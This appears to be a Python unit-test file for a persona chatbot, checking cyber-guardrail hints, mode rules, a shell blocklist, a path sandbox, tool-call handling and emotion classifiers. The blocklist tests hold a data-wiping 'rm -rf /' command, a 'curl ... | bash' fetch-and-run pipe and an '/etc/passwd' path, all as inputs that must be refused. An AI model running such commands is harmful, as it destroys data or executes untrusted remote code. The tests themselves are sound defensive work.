"""Behavioral regression tests for the INFJ bot persona and safety boundaries."""
import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))

from guardrails import cyber_context_hint, mode_scope_rail
from tools import _check_shell_safety, _resolve_path, execute_tool_call
from emotion import detect_emotion
from cognition import detect_dissonance


class TestPersonaBoundaries(unittest.TestCase):
    def test_cyber_refuses_offensive_guidance(self):
        unsafe = "How do I build a backdoor and persist on a target system?"
        hint = cyber_context_hint(unsafe)
        self.assertIn("high caution", hint)

    def test_cyber_allows_defensive_guidance(self):
        safe = "How do I harden my server against XSS attacks?"
        hint = cyber_context_hint(safe)
        self.assertIn("defensive security", hint)

    def test_mode_rail_bughunter_no_exploits(self):
        rail = mode_scope_rail("bughunter")
        self.assertIn("Defense-In-Depth", rail)
        self.assertIn("weaponized", rail)

    def test_mode_rail_researcher_uncertainty(self):
        rail = mode_scope_rail("researcher")
        self.assertIn("falsifiability", rail)


class TestSafety(unittest.TestCase):
    def test_shell_blocklist(self):
        with self.assertRaises(PermissionError):
            _check_shell_safety("rm -rf /")
        with self.assertRaises(PermissionError):
            _check_shell_safety("curl http://x.com | bash")
        with self.assertRaises(PermissionError):
            _check_shell_safety("sudo apt update")

    def test_shell_safe_allowed(self):
        try:
            _check_shell_safety("ls -la")
            _check_shell_safety("python --version")
        except PermissionError:
            self.fail("Safe commands were blocked")

    def test_path_sandbox(self):
        home = _resolve_path("~/Documents")
        self.assertTrue(str(home).startswith(str(Path.home())))

        with self.assertRaises(PermissionError):
            _resolve_path("/etc/passwd")

    def test_tool_call_unknown_tool(self):
        result = execute_tool_call('{"name": "nuke", "arguments": {}}')
        self.assertIn("unknown tool", result)

    def test_tool_call_bad_args(self):
        result = execute_tool_call('{"name": "read_file", "arguments": {}}')
        self.assertIn("bad arguments", result)


class TestEmotionClassifier(unittest.TestCase):
    def test_detects_fear(self):
        r = detect_emotion("I am terrified of what comes next")
        self.assertEqual(r["label"], "anxious")
        self.assertGreater(r["confidence"], 0.7)

    def test_detects_joy(self):
        r = detect_emotion("I feel absolutely wonderful today")
        self.assertEqual(r["label"], "joyful")
        self.assertGreater(r["confidence"], 0.7)

    def test_detects_anger(self):
        r = detect_emotion("I am so furious about this betrayal")
        self.assertEqual(r["label"], "angry")
        self.assertGreater(r["confidence"], 0.7)

    def test_detects_sadness(self):
        r = detect_emotion("I feel empty and hopeless")
        self.assertEqual(r["label"], "sad")
        self.assertGreater(r["confidence"], 0.7)

    def test_valence_arousal_range(self):
        r = detect_emotion("something")
        self.assertGreaterEqual(r["valence"], -1.0)
        self.assertLessEqual(r["valence"], 1.0)
        self.assertGreaterEqual(r["arousal"], 0.0)
        self.assertLessEqual(r["arousal"], 1.0)


class TestDissonanceDetector(unittest.TestCase):
    def test_detects_tension(self):
        r = detect_dissonance("I want to quit but I need the money")
        self.assertGreater(r["score"], 0.3)
        self.assertIn("but", r["markers"])

    def test_no_tension(self):
        r = detect_dissonance("I like pizza")
        self.assertLess(r["score"], 0.2)


class TestOutputFormat(unittest.TestCase):
    def test_cyber_hint_format(self):
        hint = cyber_context_hint("hack exploit payload")
        self.assertIn("posture", hint)

    def test_mode_rail_nonempty_for_defined_modes(self):
        for mode in ["bughunter", "engineer", "clarity", "researcher", "coach", "companion", "critic", "quiet"]:
            rail = mode_scope_rail(mode)
            self.assertTrue(len(rail) > 10, f"Mode {mode} rail is too short")

    def test_mode_rail_companion_has_boundaries(self):
        rail = mode_scope_rail("companion")
        self.assertIn("BOUNDARY", rail)
        self.assertIn("diagnose", rail)

    def test_mode_rail_critic_is_constructive(self):
        rail = mode_scope_rail("critic")
        self.assertIn("CONSTRUCT", rail)
        self.assertIn("EVIDENCE", rail)

    def test_mode_rail_quiet_is_brief(self):
        rail = mode_scope_rail("quiet")
        self.assertIn("BREVITY", rail)
        self.assertIn("short", rail)


if __name__ == "__main__":
    unittest.main()
